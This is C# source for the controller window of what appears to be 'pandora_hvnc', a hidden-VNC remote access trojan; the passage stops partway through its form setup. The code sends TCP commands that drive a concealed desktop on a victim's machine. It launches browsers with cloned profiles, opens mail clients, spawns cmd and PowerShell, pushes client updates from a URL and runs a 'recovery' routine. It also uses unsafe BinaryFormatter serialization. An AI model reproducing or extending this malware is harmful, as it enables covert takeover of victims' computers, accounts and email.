using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic.CompilerServices;

namespace HVNC
{
    public class FrmVNC : Form
    {
        private TcpClient tcpClient_0;

        private int int_0;

        private bool bool_1;

        private bool bool_2;

        public FrmTransfer FrmTransfer0;

        private IContainer components;

        private Guna2ResizeBox guna2ResizeBox1;

        private Guna2Button guna2Button2;

        private Guna2TrackBar ResizeScroll;

        private Guna2TrackBar QualityScroll;

        private Label label1;

        private Label chkClone1;

        private Label QualityLabel;

        private Panel panel1;

        public StatusStrip statusStrip1;

        private ToolStripStatusLabel toolStripStatusLabel3;

        private Guna2DragControl guna2DragControl1;

        private System.Windows.Forms.Timer timer2;

        private ToolStripStatusLabel toolStripStatusLabel2;

        private ToolStripStatusLabel toolStripStatusLabel1;

        private System.Windows.Forms.Timer timer1;

        private Guna2ImageButton CloseBtn;

        private Guna2ImageButton RestoreMaxBtn;

        private Guna2ImageButton MinBtn;

        private Panel panel4;

        private Guna2TrackBar IntervalScroll;

        private Label IntervalLabel;

        private Guna2CustomCheckBox chkClone;

        public ToolStripStatusLabel PingStatusLabel;

        private Guna2Button guna2Button3;

        private Guna2Button guna2Button1;

        private ToolStripSeparator toolStripSeparator1;

        private Panel panel3;

        private Guna2ContextMenuStrip guna2ContextMenuStrip2;

        private ToolStripMenuItem fileExplorerToolStripMenuItem;

        private ToolStripMenuItem powershellToolStripMenuItem;

        private ToolStripMenuItem cMDToolStripMenuItem;

        private ToolStripMenuItem windowsToolStripMenuItem;

        private Guna2ContextMenuStrip guna2ContextMenuStrip1;

        private ToolStripMenuItem test1ToolStripMenuItem;

        private ToolStripMenuItem test2ToolStripMenuItem;

        private ToolStripMenuItem braveToolStripMenuItem;

        private ToolStripMenuItem edgeToolStripMenuItem;

        private ToolStripMenuItem operaGXToolStripMenuItem;

        private Guna2ContextMenuStrip guna2ContextMenuStrip3;

        private Guna2Button guna2Button4;

        private ToolStripMenuItem thunderbirdToolStripMenuItem;

        private ToolStripMenuItem outlookToolStripMenuItem;

        private ToolStripMenuItem foxMailToolStripMenuItem;

        private ToolStripMenuItem copyToolStripMenuItem;

        private ToolStripMenuItem StophVNC;

        private ToolStripMenuItem toolStripMenuItem2;

        private ToolStripMenuItem StarthVNC;

        public Label ClientRecoveryLabel;

        private PictureBox VNCBox;

        public PictureBox VNCBoxe
        {
            get
            {
                return VNCBox;
            }
            set
            {
                VNCBox = value;
            }
        }

        public ToolStripStatusLabel toolStripStatusLabel2_
        {
            get
            {
                return toolStripStatusLabel2;
            }
            set
            {
                toolStripStatusLabel2 = value;
            }
        }

        public string xip { get; set; }

        public string xhostname { get; set; }

        public FrmVNC()
        {
            int_0 = 0;
            bool_1 = true;
            bool_2 = false;
            FrmTransfer0 = new FrmTransfer();
            InitializeComponent();
            VNCBox.MouseEnter += VNCBox_MouseEnter;
            VNCBox.MouseLeave += VNCBox_MouseLeave;
            VNCBox.KeyPress += VNCBox_KeyPress;
        }

        private void VNCBox_MouseEnter(object sender, EventArgs e)
        {
            VNCBox.Focus();
        }

        private void VNCBox_MouseLeave(object sender, EventArgs e)
        {
            FindForm().ActiveControl = null;
            base.ActiveControl = null;
        }

        private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
        {
            SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
        }

        private void VNCForm_Load(object sender, EventArgs e)
        {
            if (FrmTransfer0.IsDisposed)
            {
                FrmTransfer0 = new FrmTransfer();
            }
            FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            tcpClient_0 = (TcpClient)base.Tag;
            VNCBox.Tag = new Size(1028, 1028);
        }

        public void Check()
        {
            try
            {
                if (FrmTransfer0.FileTransferLabele.Text == null)
                {
                    toolStripStatusLabel3.Text = "Status";
                }
                else
                {
                    toolStripStatusLabel3.Text = FrmTransfer0.FileTransferLabele.Text;
                }
            }
            catch
            {
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            checked
            {
                int_0 += 100;
                if (int_0 >= SystemInformation.DoubleClickTime)
                {
                    bool_1 = true;
                    bool_2 = false;
                    int_0 = 0;
                }
            }
        }

        private void CopyBtn_Click(object sender, EventArgs e)
        {
            SendTCP("9*", tcpClient_0);
        }

        private void PasteBtn_Click(object sender, EventArgs e)
        {
        }

        private void ShowStart_Click(object sender, EventArgs e)
        {
            SendTCP("13*", tcpClient_0);
        }

        private void VNCBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (bool_1)
            {
                bool_1 = false;
                timer1.Start();
            }
            else if (int_0 < SystemInformation.DoubleClickTime)
            {
                bool_2 = true;
            }
            Point location = e.Location;
            object tag = VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)VNCBox.Width / (double)size.Width;
            double num2 = (double)VNCBox.Height / (double)size.Height;
            double num3 = Math.Ceiling((double)location.X / num);
            double num4 = Math.Ceiling((double)location.Y / num2);
            if (bool_2)
            {
                if (e.Button == MouseButtons.Left)
                {
                    SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
                }
            }
            else if (e.Button == MouseButtons.Left)
            {
                SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
            else if (e.Button == MouseButtons.Right)
            {
                SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
        }

        private void VNCBox_MouseUp(object sender, MouseEventArgs e)
        {
            Point location = e.Location;
            object tag = VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)VNCBox.Width / (double)size.Width;
            double num2 = (double)VNCBox.Height / (double)size.Height;
            double num3 = Math.Ceiling((double)location.X / num);
            double num4 = Math.Ceiling((double)location.Y / num2);
            if (e.Button == MouseButtons.Left)
            {
                SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
            else if (e.Button == MouseButtons.Right)
            {
                SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
        }

        private void VNCBox_MouseMove(object sender, MouseEventArgs e)
        {
            Point location = e.Location;
            object tag = VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)VNCBox.Width / (double)size.Width;
            double num2 = (double)VNCBox.Height / (double)size.Height;
            double num3 = Math.Ceiling((double)location.X / num);
            double num4 = Math.Ceiling((double)location.Y / num2);
            SendTCP("8*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
        }

        private void IntervalScroll_Scroll(object sender, EventArgs e)
        {
            IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
            SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
        }

        private void QualityScroll_Scroll(object sender, EventArgs e)
        {
            QualityLabel.Text = "Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
            SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
        }

        private void ResizeScroll_Scroll(object sender, EventArgs e)
        {
            chkClone1.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
            SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
        }

        private void RestoreMaxBtn_Click(object sender, EventArgs e)
        {
            SendTCP("15*", tcpClient_0);
        }

        private void MinBtn_Click(object sender, EventArgs e)
        {
            SendTCP("14*", tcpClient_0);
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            SendTCP("16*", tcpClient_0);
        }

        private void StartExplorer_Click(object sender, EventArgs e)
        {
            SendTCP("21*", tcpClient_0);
        }

        private void StartBrowserBtn_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("11*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("11*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void SendTCP(object object_0, TcpClient tcpClient_1)
        {
            checked
            {
                try
                {
                    lock (tcpClient_1)
                    {
                        BinaryFormatter binaryFormatter = new BinaryFormatter();
                        binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                        binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                        binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                        object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                        ulong num = 0uL;
                        MemoryStream memoryStream = new MemoryStream();
                        binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                        num = (ulong)memoryStream.Position;
                        tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                        byte[] buffer = memoryStream.GetBuffer();
                        tcpClient_1.GetStream().Write(buffer, 0, (int)num);
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                }
                catch (Exception projectError)
                {
                    ProjectData.SetProjectError(projectError);
                    ProjectData.ClearProjectError();
                }
            }
        }

        private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
        {
            SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
        }

        private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            SendTCP("1*", tcpClient_0);
            VNCBox.Image = null;
            GC.Collect();
            Hide();
            e.Cancel = true;
        }

        private void VNCForm_Click(object sender, EventArgs e)
        {
            method_18(null);
        }

        private void method_18(object object_0)
        {
            base.ActiveControl = (Control)object_0;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            Check();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("32*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("32*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
            {
                SendTCP("24*", tcpClient_0);
                Close();
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            SendTCP("4875*", tcpClient_0);
        }

        private void button8_Click(object sender, EventArgs e)
        {
            SendTCP("4876*", tcpClient_0);
        }

        private void IntervalScroll_Scroll(object sender, ScrollEventArgs e)
        {
            IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
            SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
        }

        private void ResizeScroll_Scroll(object sender, ScrollEventArgs e)
        {
            chkClone1.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
            SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
        }

        private void QualityScroll_Scroll(object sender, ScrollEventArgs e)
        {
            QualityLabel.Text = "High Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
            SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
            {
                SendTCP("24*", tcpClient_0);
                Close();
            }
        }

        private void VNCBox_MouseHover(object sender, EventArgs e)
        {
            VNCBox.Focus();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("444*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("444*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void Outlookbtn_Click(object sender, EventArgs e)
        {
            SendTCP("555*", tcpClient_0);
        }

        private void Foxmailbtn_Click(object sender, EventArgs e)
        {
            SendTCP("556*", tcpClient_0);
        }

        private void Thunderbirdbtn_Click(object sender, EventArgs e)
        {
            SendTCP("557*", tcpClient_0);
        }

        private void guna2Button3_Click_1(object sender, EventArgs e)
        {
            guna2ContextMenuStrip2.Show(guna2Button1, 0, guna2Button1.Height);
        }

        private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("21*", tcpClient_0);
        }

        private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("4876*", tcpClient_0);
        }

        private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("4875*", tcpClient_0);
        }

        private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("13*", tcpClient_0);
        }

        private void guna2GroupBox1_Click(object sender, EventArgs e)
        {
        }

        private void guna2Button3_Click_2(object sender, EventArgs e)
        {
            guna2ContextMenuStrip2.Show(guna2Button3, 0, guna2Button3.Height);
        }

        private void guna2Button1_Click_1(object sender, EventArgs e)
        {
            guna2ContextMenuStrip1.Show(guna2Button1, 0, guna2Button1.Height);
        }

        private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("11*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("11*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void braveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("32*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("32*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void operaGXToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("444*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("444*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void guna2Button4_Click_1(object sender, EventArgs e)
        {
            guna2ContextMenuStrip3.Show(guna2Button4, 0, guna2Button4.Height);
        }

        private void thunderbirdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("557*", tcpClient_0);
        }

        private void outlookToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("555*", tcpClient_0);
        }

        private void foxMailToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("556*", tcpClient_0);
        }

        public void hURL(string url)
        {
            SendTCP("8585* " + url, (TcpClient)base.Tag);
        }

        public void UpdateClient(string url)
        {
            SendTCP("8589* " + url, (TcpClient)base.Tag);
        }

        public void ResetScale()
        {
            SendTCP("8587*", (TcpClient)base.Tag);
        }

        public void KillChrome()
        {
            SendTCP("8586*", (TcpClient)base.Tag);
        }

        public void PandoraRecovery()
        {
            SendTCP("3308*", (TcpClient)base.Tag);
            Thread.Sleep(500);
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("3307*", tcpClient_0);
        }

        private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("3306*" + Clipboard.GetText(), (TcpClient)base.Tag);
        }

        private void StarthVNC_Click(object sender, EventArgs e)
        {
            SendTCP("0*", tcpClient_0);
            FrmTransfer0.FileTransferLabele.Text = "hVNC Started!";
        }

        private void StophVNC_Click(object sender, EventArgs e)
        {
            SendTCP("1*", tcpClient_0);
            VNCBox.Image = null;
            FrmTransfer0.FileTransferLabele.Text = "hVNC Stopped!";
            GC.Collect();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmVNC));
            this.guna2ResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.panel1 = new System.Windows.Forms.Panel();
            this.ClientRecoveryLabel = new System.Windows.Forms.Label();
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.PingStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.label1 = new System.Windows.Forms.Label();
            this.chkClone = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.ResizeScroll = new Guna.UI2.WinForms.Guna2TrackBar();
            this.QualityScroll = new Guna.UI2.WinForms.Guna2TrackBar();
            this.chkClone1 = new System.Windows.Forms.Label();
            this.QualityLabel = new System.Windows.Forms.Label();
            this.IntervalLabel = new System.Windows.Forms.Label();
            this.IntervalScroll = new Guna.UI2.WinForms.Guna2TrackBar();
            this.panel4 = new System.Windows.Forms.Panel();
            this.guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
            this.CloseBtn = new Guna.UI2.WinForms.Guna2ImageButton();
            this.RestoreMaxBtn = new Guna.UI2.WinForms.Guna2ImageButton();
            this.MinBtn = new Guna.UI2.WinForms.Guna2ImageButton();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.panel3 = new System.Windows.Forms.Panel();
            this.guna2Button4 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.fileExplorerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.powershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cMDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.windowsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.StarthVNC = new System.Windows.Forms.ToolStripMenuItem();
            this.StophVNC = new System.Windows.Forms.ToolStripMenuItem();
            this.guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.test1ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.test2ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.braveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.edgeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.operaGXToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.guna2ContextMenuStrip3 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.thunderbirdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.outlookToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.foxMailToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.VNCBox = new System.Windows.Forms.PictureBox();
            this.panel1.SuspendLayout();
            this.statusStrip1.SuspendLayout();
            this.panel4.SuspendLayout();
            this.panel3.SuspendLayout();
            this.guna2ContextMenuStrip2.SuspendLayout();
            this.guna2ContextMenuStrip1.SuspendLayout();
            this.guna2ContextMenuStrip3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.VNCBox)).BeginInit();
            this.SuspendLayout();
            // 
            // guna2ResizeBox1
            // 
            this.guna2ResizeBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ResizeBox1.BackColor = System.Drawing.Color.Black;
            this.guna2ResizeBox1.FillColor = System.Drawing.Color.Gainsboro;
            this.guna2ResizeBox1.ForeColor = System.Drawing.Color.Black;
            this.guna2ResizeBox1.Location = new System.Drawing.Point(915, 470);
            this.guna2ResizeBox1.Name = "guna2ResizeBox1";
            this.guna2ResizeBox1.Size = new System.Drawing.Size(20, 20);
            this.guna2ResizeBox1.TabIndex = 35;
            this.guna2ResizeBox1.TargetControl = this;
            // 
            // guna2DragControl1
            // 
            this.guna2DragControl1.TargetControl = this.panel1;
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.panel1.Controls.Add(this.ClientRecoveryLabel);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel1.Location = new System.Drawing.Point(0, 0);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(935, 38);
            this.panel1.TabIndex = 32;
            this.panel1.Paint += new System.Windows.Forms.PaintEventHandler(this.panel1_Paint);
            // 
            // ClientRecoveryLabel
            // 
            this.ClientRecoveryLabel.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.ClientRecoveryLabel.AutoSize = true;
            this.ClientRecoveryLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ClientRecoveryLabel.ForeColor = System.Drawing.Color.Gainsboro;
            this.ClientRecoveryLabel.Location = new System.Drawing.Point(12, 9);
            this.ClientRecoveryLabel.Name = "ClientRecoveryLabel";
            this.ClientRecoveryLabel.Size = new System.Drawing.Size(85, 15);
            this.ClientRecoveryLabel.TabIndex = 1;
            this.ClientRecoveryLabel.Text = "pandora_hvnc";
            this.ClientRecoveryLabel.Click += new System.EventHandler(this.ClientRecoveryLabel_Click);
            // 
            // timer2
            // 
            this.timer2.Enabled = true;
            this.timer2.Interval = 1000;
            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
            // 
            // toolStripStatusLabel2
            // 
            this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
            this.toolStripStatusLabel2.Size = new System.Drawing.Size(26, 17);
            this.toolStripStatusLabel2.Text = "Idle";
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(44, 17);
            this.toolStripStatusLabel1.Text = "Statut :";
            // 
            // toolStripStatusLabel3
            // 
            this.toolStripStatusLabel3.ForeColor = System.Drawing.Color.Gainsboro;
            this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
            this.toolStripStatusLabel3.Size = new System.Drawing.Size(39, 17);
            this.toolStripStatusLabel3.Text = "Status";
            // 
            // statusStrip1
            // 
            this.statusStrip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.statusStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Visible;
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripStatusLabel3,
            this.PingStatusLabel});
            this.statusStrip1.Location = new System.Drawing.Point(0, 468);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(935, 22);
            this.statusStrip1.TabIndex = 19;
            // 
            // PingStatusLabel
            // 
            this.PingStatusLabel.ForeColor = System.Drawing.Color.Gainsboro;
            this.PingStatusLabel.Name = "PingStatusLabel";
            this.PingStatusLabel.Size = new System.Drawing.Size(59, 17);
            this.PingStatusLabel.Text = "Ping: 0ms";
            this.PingStatusLabel.Visible = false;
            // 
            // timer1
            // 
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // label1
            // 
            this.label1.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.label1.AutoSize = true;
            this.label1.ForeColor = System.Drawing.Color.Gainsboro;
            this.label1.Location = new System.Drawing.Point(41, 13);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(102, 13);
            this.label1.TabIndex = 4;
            this.label1.Text = "Enable Clone Profile";
            // 
            // chkClone
            // 
            this.chkClone.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.chkClone.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.chkClone.CheckedState.BorderRadius = 2;
            this.chkClone.CheckedState.BorderThickness = 0;
            this.chkClone.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.chkClone.CheckedState.Parent = this.chkClone;
            this.chkClone.ForeColor = System.Drawing.Color.Gainsboro;
            this.chkClone.Location = new System.Drawing.Point(12, 8);
            this.chkClone.Name = "chkClone";
            this.chkClone.ShadowDecoration.Parent = this.chkClone;
            this.chkClone.Size = new System.Drawing.Size(23, 23);
            this.chkClone.TabIndex = 4;
            this.chkClone.Text = "guna2CustomCheckBox1";
            this.chkClone.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.chkClone.UncheckedState.BorderRadius = 2;
            this.chkClone.UncheckedState.BorderThickness = 0;
            this.chkClone.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.chkClone.UncheckedState.Parent = this.chkClone;
            // 
            // ResizeScroll
            // 
            this.ResizeScroll.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.ResizeScroll.HoverState.Parent = this.ResizeScroll;
            this.ResizeScroll.Location = new System.Drawing.Point(458, 5);
            this.ResizeScroll.Name = "ResizeScroll";
            this.ResizeScroll.Size = new System.Drawing.Size(120, 27);
            this.ResizeScroll.TabIndex = 8;
            this.ResizeScroll.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.ResizeScroll.Value = 75;
            this.ResizeScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(this.ResizeScroll_Scroll);
            // 
            // QualityScroll
            // 
            this.QualityScroll.Anchor = System.Windows.Forms.AnchorStyles.Top;
